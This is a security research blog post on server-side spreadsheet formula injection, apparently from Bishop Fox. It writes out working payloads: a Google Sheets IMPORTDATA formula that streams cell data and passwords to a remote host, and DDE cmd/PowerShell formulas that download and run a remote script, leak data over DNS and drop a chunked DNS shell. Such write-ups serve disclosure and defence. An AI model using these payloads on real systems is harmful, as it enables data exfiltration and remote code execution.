---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-06-11_server-side-spreadsheet-injection-formula-injection-to-remote-code-execution.md
original_filename: 2018-06-11_server-side-spreadsheet-injection-formula-injection-to-remote-code-execution.md
title: Server-Side Spreadsheet Injection – Formula Injection to Remote Code Execution
category: documents
detected_topics:
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: 2afbe8d8e50c4d45cb41200706b11b5840c398b93bfc26c8de31b3756e8f2b1d
text_sha256: 2030b076a3393062148d0fe5f04ceeed0979bd56a5f7f0a7e100ac10f2b60985
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Server-Side Spreadsheet Injection – Formula Injection to Remote Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-06-11_server-side-spreadsheet-injection-formula-injection-to-remote-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `2afbe8d8e50c4d45cb41200706b11b5840c398b93bfc26c8de31b3756e8f2b1d`
- Text SHA256: `2030b076a3393062148d0fe5f04ceeed0979bd56a5f7f0a7e100ac10f2b60985`


## Content

---
title: "Server-Side Spreadsheet Injection – Formula Injection to Remote Code Execution"
page_title: "Server-Side Spreadsheet Injection - Formula Injection to… | Bishop Fox"
url: "https://www.bishopfox.com/blog/2018/06/server-side-spreadsheet-injections/"
final_url: "https://bishopfox.com/blog/server-side-spreadsheet-injections/"
authors: ["Jake Miller"]
programs: ["Google"]
bugs: ["CSV injection", "Server side spreadsheet injection", "Formula injection", "RCE"]
publication_date: "2018-06-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5845
---

Share

[ ](https://www.facebook.com/share.php?u=https://bishopfox.com/blog/server-side-spreadsheet-injections&amp;utm_medium=social&amp;utm_source=facebook) [ ](https://twitter.com/intent/tweet?url=https://bishopfox.com/blog/server-side-spreadsheet-injections&utm_medium=social&utm_source=twitter&source=tweetbutton&text=) [ ](http://www.linkedin.com/shareArticle?mini=true&url=https://bishopfox.com/blog/server-side-spreadsheet-injections&utm_medium=social&utm_source=linkedin) [ ](/feeds/technology.rss)

Over the past year, I came across two server-side attack vectors based on CSV injection (explained well [here](https://www.contextis.com/blog/comma-separated-vulnerabilities)). The first case shows an instance of data exfiltration via Google Sheets Injection, while the second case demonstrates a path from formula injection to remote code execution.  

## Case #1 Google Sheets Injection

A client of ours created a G-Suite integrated application that supported bulk user management by exporting the current list of application users to a spreadsheet in Google Drive. The administrator could then edit that Google spreadsheet and reupload the document into the application to perform bulk user provisioning.

The exported spreadsheet included columns, such as first name, last name and a profile description of each user. The team targeted the description field of our own user with a formula payload. This malicious description would be used in the construction of the exported spreadsheet. The formula would execute, concatenating all of the cells (A1-R18, in this case) in the spreadsheet, exfiltrate the data to our site, and suppress error messages through use of the IFERROR function:
  
  
  =IFERROR(IMPORTDATA(CONCAT("http://g.bishopfox.com:8000/save/",JOIN(",",B3:B18,C3:C18,D3:D18
  
  ,E3:E18,F3:F18,G3:G18,H3:H18,I3:I18,J3:J18,K3:K18,L3:L18,M3:M18,N3:N18,O3:O18,P3:P18,Q3:Q18,R3:R18))),"")
  

Because formula results rely on dependent variables, the formula recalculated each time a dependent cell was modified. This allowed us to receive live-streaming updates from the exported spreadsheet to our server. For example, when new users were provisioned, a column for initial passwords was used. We received the passwords and the rest of the spreadsheet each time the administrator finished editing a cell (A1-R18):

![Describing an injected formula payload into a value used in an exported spreadsheet.](https://cdn2.hubspot.net/hubfs/5632775/Imported_Blog_Media/Image1.png)

By injecting a formula payload into a value used in the exported spreadsheet (our user’s description), we were able to record all updates performed by the administrator.

In summary, Google Sheets does not have data exfiltration protection. Exercise caution when opening software-generated documents in Google Sheets.

## Case #2 Server-side Formula Injection to Remote Code Execution

We identified two applications that were vulnerable to remote code execution via formula injection. Both of these web applications converted uploaded XLS*/CSV documents into image documents during the upload process. This conversion relied on instrumenting the Excel software on a Windows-based host.

### **First Application**

The first question was what did it mean to convert an Excel spreadsheet to an image? How would formulas be handled?

When we were initially probing the service, we used payloads such as =SUM(1,1) and surprisingly saw the payload evaluated in the image response as 2. Were they using cached results, or was it dynamically evaluating the formulas on the server-side?

We uploaded a spreadsheet the formula =NOW(), the current timestamp was returned. So, we knew that our formulas being interpreted in real-time! Let’s try to leverage the traditionally client-side DDE attack as a server-side attack using Metasploit’s exploit/multi/script/web_delivery payload.

Spreadsheet payload
  
  
  =cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString("http://bishopfox.com/shell.ps1");

powershell -e $e'!A1

We got a shell. 

With the shell, we used the EC2 metadata URL to leverage the machine’s identity to gain control of assets throughout the cloud environment. We assumed this would be a cool, one-time shell until we saw it again a few months later …

## **Second Application**

This instance resembled the previous upload-based attack vector, except that document conversion server had TCP egress protections. We leveraged the SensePost Powershell DNS Shell through chained formula injection to obtain an interactive shell.

We initially observed the egress protections after our Metasploit web_delivery payload failed to execute. We then used the WEBSERVICE function to explore the egress rules.
  
  
  =WEBSERVICE(“http://bishopfox.com”)

No response over HTTP.
  
  
  =WEBSERVICE(“https://bishopfox.com”)

No response over HTTPs.
  
  
  =WEBSERVICE(“http://dnstest.bishopfox.com”)
  

DNS received. Do we have DDE command execution?
  
  
  =CMD|’/c for /f "delims=" %a in ('hostname') do nslookup %a.bishopfox.com ’|!A0

![Response from DDE command execution.](https://cdn2.hubspot.net/hubfs/5632775/Imported_Blog_Media/Image2.png)

Great! Do we have PowerShell?
  
  
  =CMD|’/c powershell nslookup dnstest.17.bishopfox.com’|!A1

Cool! Let’s make a DNS shell _through_ PowerShell _through_ DDE _via_ formula injection. After failed attempts at creating a payload that would fit within the constraints of the 255-character constant string literals required by the DDE formula syntax, we created a chained command to transfer the Base64-encoded SensePost DNS shell in chunks, as shown below:
  
  
  =cmd|'/C echo|set /p="JHVybCA9ICJiaXNob3Bmb3guY29tIjtmdW5jdGlvbiBleGVjRE5TKA==" > C:\ProgramData\activePDF\Temp\a.enc'!A0
  
  +cmd|'/C echo|set /p="ACQAYwBtAGQAKQAgAHsACgAkAGMAIAA9ACAAaQBlAHgAIAAkAGMAbQBkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkA" >> C:\ProgramData\activePDF\Temp\a.enc'!A0
  
  +...omitted for brevity...
  
  +cmd|'/C powershell -c "$a=Get-Content C:\ProgramData\activePDF\Temp\a.enc;powershell -e $a"'!A0
  

After all the portions of the application were written to disk, the final DDE command could invoke the payload (The -e flag allows execution of Base64 encoded PowerShell scripts. Alternatively, CertUtil.exe can be used decode the payloads). Writable directories can likely be identified by using the INFO/CELL formula commands to identify the current working directory and the directory hosting the executing spreadsheet.

## Conclusion

These vulnerabilities show the emerging class of client-side vulnerabilities that are manifesting as server-side vulnerabilities. As we continue to rely on SaaS, and delegate tasks such as Office document file conversion away from the desktop environment, we can expect to see more client-side vulnerabilities emerge in server-side attack surface.  

* * *

![Jake Miller](https://assets.bishopfox.com/prod-1437/Images/headshots/jake-miller.jpg)

By Jake Miller 

Security Researcher

Jake Miller (OSCE, OSCP) is a Bishop Fox alumnus and former lead researcher. While at Bishop Fox, Jake was responsible for overseeing firm-wide research initiatives. He also produced award-winning research in addition to several popular hacking tools like RMIScout and GitGot.  
  
---  
  
[ More by Jake Miller  ](https://bishopfox.com/authors/jake-miller)

[ ](https://twitter.com/theBumbleSec) [ ](https://www.linkedin.com/in/jake-miller-security/)

![](/static/assets/images/backgrounds/lander-header-bg-black-lines.svg)

Subscribe to our blog

Be first to learn about latest tools, advisories, and findings.

Thank You! You have been subscribed.
